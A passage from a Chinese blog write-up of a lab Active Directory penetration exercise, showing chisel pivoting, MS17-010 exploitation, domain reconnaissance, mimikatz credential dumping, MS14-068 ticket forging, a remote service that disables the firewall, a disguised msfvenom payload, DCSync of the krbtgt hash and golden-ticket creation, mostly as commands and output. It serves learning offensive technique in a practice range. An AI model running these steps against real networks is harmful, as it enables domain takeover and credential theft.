<p>这里需要注意几点：</p>
<ol>
<li><code>ssh -i kali ubuntu@192.168.150.160</code>必须在<code>kali</code>上的<code>kali</code>用户下执行</li>
<li><code>sudoers</code>文件的权限只能是只读，上面我们改成<code>777</code>，需要把它改成<code>440</code></li>
<li><code>sudo -s</code>提升权限到<code>root</code></li>
</ol>
<h2 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h2><p>利用<code>chisel</code>搭建代理</p>
<p><a href="https://xax007.github.io/2019/04/12/pivoting-with-chisel.html" target="_blank" rel="noopener">https://xax007.github.io/2019/04/12/pivoting-with-chisel.html</a></p>
<p>目标机器</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@ubuntu:~$ .&#x2F;chisel server -p 9001 --socks5</span><br></pre></td></tr></table></figure>

<p>kali</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# .&#x2F;chisel client 192.168.150.160:9001 socks</span><br></pre></td></tr></table></figure>

<p>上大杀器<code>metasploit</code>，利用<code>ms17-010</code>，返回<code>meterpreter</code></p>
<p><img src="http://www.sectime.top:8888/images/2020/05/16/attck443.png" alt="attck443.png"></p>
<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p><code>getuid</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br></pre></td></tr></table></figure>

<p><code>ps</code>查看应用创建的服务</p>
<p><img src="http://www.sectime.top:8888/images/2020/05/16/attck424.png" alt="attck424.png"></p>
<p>输入<code>shell</code>，进入系统</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 2108 created.</span><br><span class="line">Channel 1 created.</span><br></pre></td></tr></table></figure>

<p><code>net view</code>，存在<code>demo</code>域</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\system32&gt;net view &#x2F;domain</span><br><span class="line">net view &#x2F;domain</span><br><span class="line">Domain</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">DEMO                 </span><br><span class="line">The command completed successfully.</span><br></pre></td></tr></table></figure>

<p><code>net view /domain:demo</code>查看域内机器</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\system32&gt;net view &#x2F;domain:demo</span><br><span class="line">net view &#x2F;domain:demo</span><br><span class="line">Server Name            Remark</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">\\TESTWIN7-PC   </span><br><span class="line">\\WIN-ENS2VR5TR3N                                                              </span><br><span class="line">The command completed successfully.</span><br></pre></td></tr></table></figure>

<p><code>net group &quot;domain ontrollers&quot; /domain</code>查看域控</p>
<p><img src="http://www.sectime.top:8888/images/2020/05/16/attck425.png" alt="attck425.png"></p>
<p>出现这种情况，首先<code>exit</code>退出shell，然后<code>steal_token 进程号</code> ，再<code>shell</code>进入</p>
<p><img src="http://www.sectime.top:8888/images/2020/05/16/attck426.png" alt="attck426.png"></p>
<p>域控：\\WIN-ENS2VR5TR3N </p>
<p><code>wmic computersystem get domain</code>查看完整域名</p>
<p><img src="http://www.sectime.top:8888/images/2020/05/16/attck427.png" alt="attck427.png"></p>
<p><code>net group &quot;domain admins&quot; /domain</code>查看域内管理员</p>
<p><img src="http://www.sectime.top:8888/images/2020/05/16/attck428.png" alt="attck428.png"></p>
<p><code>net group &quot;domain users&quot; /domain</code> 查看域内用户</p>
<p><img src="http://www.sectime.top:8888/images/2020/05/16/attck429.png" alt="attck429.png"></p>
<p><code>nslookup \\WIN-ENS2VR5TR3N</code> 查看域控IP</p>
<p><img src="http://www.sectime.top:8888/images/2020/05/16/attck430.png" alt="attck430.png"></p>
<p><code>whoami /all</code>获取用户<code>SID</code>: <code>S-1-5-21-979886063-1111900045-1414766810-1107</code></p>
<p><img src="http://www.sectime.top:8888/images/2020/05/16/attck431.png" alt="attck431.png"></p>
<p>域的<code>SID</code>，用户<code>SID</code>去掉最后的<code>-</code>及其后面的，即<code>S-1-5-21-979886063-1111900045-1414766810</code></p>
<p>信息收集到这就差不多了，当然越详细越好。</p>
<p><strong>抓密码</strong></p>
<p><code>rev2self</code>提升权限，调用<code>kiwi</code></p>
<p><img src="http://www.sectime.top:8888/images/2020/05/16/attck432.png" alt="attck432.png"></p>
<p><code>creds_all</code></p>
<p><img src="http://www.sectime.top:8888/images/2020/05/16/attck433.png" alt="attck433.png"></p>
<p><strong>注意：</strong> 因为登录过域成员，所以密码是明文</p>
<p>如果没有登录过，可以用上面的<code>NTLM hash</code></p>
<p><code>systeminfo</code></p>
<p><img src="http://www.sectime.top:8888/images/2020/05/16/attck434.png" alt="attck434.png"></p>
<p>我们可以利用<code>mss14-068</code>，搜索其补丁号，若没有打补丁，说明漏洞存在</p>
<p>这个靶场做的很贴心，里面有很多工具，若没有，我们可以自己上传</p>
<p><img src="http://www.sectime.top:8888/images/2020/05/16/attck435.png" alt="attck435.png"></p>
<p>开搞！！！</p>
<p>假如我们想查看域控的C盘根目录<code>dir \\WIN-ENS2VR5TR3N\c$</code></p>
<p><img src="http://www.sectime.top:8888/images/2020/05/16/attck436.png" alt="attck436.png"></p>
<p>发现不行，我们要使用<code>MS17-068</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MS14-068.exe -u douser@demo.com -p Dotest123 -s S-1-5-21-979886063-1111900045-1414766810-1107 -d 192.168.183.130</span><br></pre></td></tr></table></figure>

<p><img src="http://www.sectime.top:8888/images/2020/05/16/attck437.png" alt="attck437.png"></p>
<p>生成了一个票据，用<code>mimikatz</code>导入</p>
<p><img src="http://www.sectime.top:8888/images/2020/05/16/attck438.png" alt="attck438.png"></p>
<p>再次执行<code>dir \\WIN-ENS2VR5TR3N\c$</code>，成功</p>
<p><img src="http://www.sectime.top:8888/images/2020/05/16/attck439.png" alt="attck439.png"></p>
<p>远程执行命令</p>
<p>创建关闭防火墙的服务</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc \\WIN-ENS2VR5TR3N create ProtectFirewall binpath&#x3D; &quot;netsh advfirewall set allprofiles state off&quot;</span><br></pre></td></tr></table></figure>

<p><img src="http://www.sectime.top:8888/images/2020/05/16/attck440.png" alt="attck440.png"></p>
<p>制作反弹shell木马</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcp LPORT&#x3D;6001 -f exe-service -o update.exe</span><br></pre></td></tr></table></figure>

<p>上传到域成员douser，查看当前目录<code>pwd</code>，<code>upload update.exe</code></p>
<p><img src="http://www.sectime.top:8888/images/2020/05/16/attck445.png" alt="attck445.png"></p>
<p>创建反弹shell服务</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc \\WIN-ENS2VR5TR3N create Shell binpath&#x3D; &quot;C:\update.exe&quot;</span><br></pre></td></tr></table></figure>

<p>设置监听，先不执行</p>
<p><img src="http://www.sectime.top:8888/images/2020/05/16/attck444.png" alt="attck444.png"></p>
<p>执行关闭防火墙的服务</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc \\WIN-ENS2VR5TR3N start ProtectFirewall</span><br></pre></td></tr></table></figure>

<p>虽然提示失败了，但是防火墙确实关闭了</p>
<p><img src="http://www.sectime.top:8888/images/2020/05/16/attck441.png" alt="attck441.png"></p>
<p>执行反弹shell服务</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc \\WIN-ENS2VR5TR3N start Shell</span><br></pre></td></tr></table></figure>

<p><img src="http://www.sectime.top:8888/images/2020/05/16/attck446.png" alt="attck446.png"></p>
<p>开启监听，shell弹回来，拿到域控的shell</p>
<p><img src="http://www.sectime.top:8888/images/2020/05/16/attck447.png" alt="attck447.png"></p>
<p>接下来，我们可以抓key，构造黄金令牌</p>
<p><code>load kiwi</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; load kiwi</span><br><span class="line">Loading extension kiwi...</span><br><span class="line">  .#####.   mimikatz 2.2.0 20191125 (x64&#x2F;windows)</span><br><span class="line"> .## ^ ##.  &quot;A La Vie, A L&#39;Amour&quot; - (oe.eo)</span><br><span class="line"> ## &#x2F; \ ##  &#x2F;*** Benjamin DELPY &#96;gentilkiwi&#96; ( benjamin@gentilkiwi.com )</span><br><span class="line"> ## \ &#x2F; ##       &gt; http:&#x2F;&#x2F;blog.gentilkiwi.com&#x2F;mimikatz</span><br><span class="line"> &#39;## v ##&#39;        Vincent LE TOUX            ( vincent.letoux@gmail.com )</span><br><span class="line">  &#39;#####&#39;         &gt; http:&#x2F;&#x2F;pingcastle.com &#x2F; http:&#x2F;&#x2F;mysmartlogon.com  ***&#x2F;</span><br><span class="line"></span><br><span class="line">Success.</span><br></pre></td></tr></table></figure>

<p><code>help</code>可以帮助我们查看<code>command</code>文档</p>
<p><code>dcsync_ntlm</code> 来还原<code>krbtgt</code>的<code>hash</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; dcsync_ntlm krbtgt</span><br><span class="line">[!] Running as SYSTEM, function will not work.</span><br></pre></td></tr></table></figure>

<p>出现这种情况，我们需要伪造administrator，然后再执行<code>dcsync_ntlm krbtgt</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; steal_token 1952</span><br><span class="line">Stolen token with username: DEMO\administrator</span><br><span class="line">meterpreter &gt; dcsync_ntlm krbtgt</span><br><span class="line">[+] Account   : krbtgt</span><br><span class="line">[+] NTLM Hash : 7c4ed692473d4b4344c3ba01c5e6cb63</span><br><span class="line">[+] LM Hash   : 4d81a5d6b591f0710e75884e5ef9cba2</span><br><span class="line">[+] SID       : S-1-5-21-979886063-1111900045-1414766810-502</span><br><span class="line">[+] RID       : 502</span><br></pre></td></tr></table></figure>

<p><code>golden_ticket_create</code>构造黄金票据</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; golden_ticket_create -d demo.com -u Administrator -s S-1-5-21-979886063-1111900045-1414766810 -k 7c4ed692473d4b4344c3ba01c5e6cb63 -t &#x2F;home&#x2F;kali&#x2F;kali.tck</span><br><span class="line">[+] Golden Kerberos ticket written to &#x2F;home&#x2F;kali&#x2F;kali.tck</span><br><span class="line"></span><br><span class="line">参数介绍</span><br><span class="line">-t &#x2F;home&#x2F;kali&#x2F;kali.tck</span><br><span class="line">-d  域名</span><br><span class="line">-u  要伪造的用户</span><br><span class="line">-s  域SID</span><br><span class="line">-k  krbtge的ntlm</span><br><span class="line">-t  保存的本地路径</span><br></pre></td></tr></table></figure>

<p>导入黄金票据</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">eter &gt; kerberos_ticket_use &#x2F;home&#x2F;kali&#x2F;kali.tck</span><br><span class="line">[*] Using Kerberos ticket stored in &#x2F;home&#x2F;kali&#x2F;kali.tck, 1820 bytes ...</span><br><span class="line">[+] Kerberos ticket applied successfully.</span><br></pre></td></tr></table></figure>

<p>查看域控的c盘根目录</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\system32&gt;dir \\WIN-ENS2VR5TR3N\c$</span><br><span class="line">dir \\WIN-ENS2VR5TR3N\c$</span><br><span class="line"> Volume in drive \\WIN-ENS2VR5TR3N\c$ has no label.</span><br><span class="line"> Volume Serial Number is 702B-0D1B</span><br><span class="line"></span><br><span class="line"> Directory of \\WIN-ENS2VR5TR3N\c$</span><br><span class="line"></span><br><span class="line">2009&#x2F;07&#x2F;14  11:20    &lt;DIR&gt;          PerfLogs</span><br><span class="line">2020&#x2F;01&#x2F;24  13:30    &lt;DIR&gt;          Program Files</span><br><span class="line">2020&#x2F;01&#x2F;24  13:30    &lt;DIR&gt;          Program Files (x86)</span><br><span class="line">2020&#x2F;05&#x2F;16  11:39            48,640 update.exe</span><br><span class="line">2019&#x2F;12&#x2F;31  11:01    &lt;DIR&gt;          Users</span><br><span class="line">2020&#x2F;01&#x2F;24  13:33    &lt;DIR&gt;          Windows</span><br><span class="line">               1 File(s)         48,640 bytes</span><br><span class="line">               5 Dir(s)  12,438,585,344 bytes free</span><br></pre></td></tr></table></figure>






  </div>
</article>


    <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
    <script src='//unpkg.com/valine/dist/Valine.min.js'></script>
    <div id="vcomments" class="blog-post-comments"></div>
    <script>
        new Valine({
            el: '#vcomments',
            visitor: true,
            appId: 'euAQjqlW2tS4fVHxsmyLkdLj-gzGzoHsz',
            appKey: 'Fmn6CIIN9yyDif6AC2hxSglA',
            placeholder: 'ヾﾉ≧∀≦)o来啊，快活啊!',
            avatar: 'robohash'
        })
    </script>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="http://www.sectime.top:8888" target="_blank" rel="noopener">Img</a></li>
         
          <li><a href="/links/">Links</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="http://github.com/mysecroad" target="_blank" rel="noopener">Projects</a></li>
         
          <li><a href="/search/">Search</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#环境搭建"><span class="toc-number">2.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#get-shell"><span class="toc-number">3.</span> <span class="toc-text">get shell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#使用msf"><span class="toc-number">3.1.</span> <span class="toc-text">使用msf</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#docker逃逸"><span class="toc-number">4.</span> <span class="toc-text">docker逃逸</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#横向移动"><span class="toc-number">5.</span> <span class="toc-text">横向移动</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#信息收集"><span class="toc-number">5.1.</span> <span class="toc-text">信息收集</span></a></li></ol></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://imysec.github.io/posts/50306.html" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://imysec.github.io/posts/50306.html&text=ATT&amp;CK实战系列四" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://imysec.github.io/posts/50306.html&title=ATT&amp;CK实战系列四" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://imysec.github.io/posts/50306.html&is_video=false&description=ATT&amp;CK实战系列四" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=ATT&amp;CK实战系列四&body=Check out this article: http://imysec.github.io/posts/50306.html"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://imysec.github.io/posts/50306.html&title=ATT&amp;CK实战系列四" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://imysec.github.io/posts/50306.html&title=ATT&amp;CK实战系列四" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://imysec.github.io/posts/50306.html&title=ATT&amp;CK实战系列四" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://imysec.github.io/posts/50306.html&title=ATT&amp;CK实战系列四" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://imysec.github.io/posts/50306.html&name=ATT&amp;CK实战系列四&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://imysec.github.io/posts/50306.html&t=ATT&amp;CK实战系列四" target="_blank" rel="noopener"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2018-2020
	<img src="https://static.dy208.cn/o_1dfilp8ruo521thr1hvf18ji17soa.png">
	<a href="http://www.beian.miit.gov.cn/"  style="color:#f72b07" target="_blank">豫ICP备20012507号</a>
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="http://www.sectime.top:8888" target="_blank" rel="noopener">Img</a></li>
         
          <li><a href="/links/">Links</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="http://github.com/mysecroad" target="_blank" rel="noopener">Projects</a></li>
         
          <li><a href="/search/">Search</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->

<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">


<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">


    <!-- jquery -->

<script src="/lib/jquery/jquery.min.js"></script>


<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>

<!-- clipboard -->

  
<script src="/lib/clipboard/clipboard.min.js"></script>

  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

<!-- Disqus Comments -->


</body>
</html>
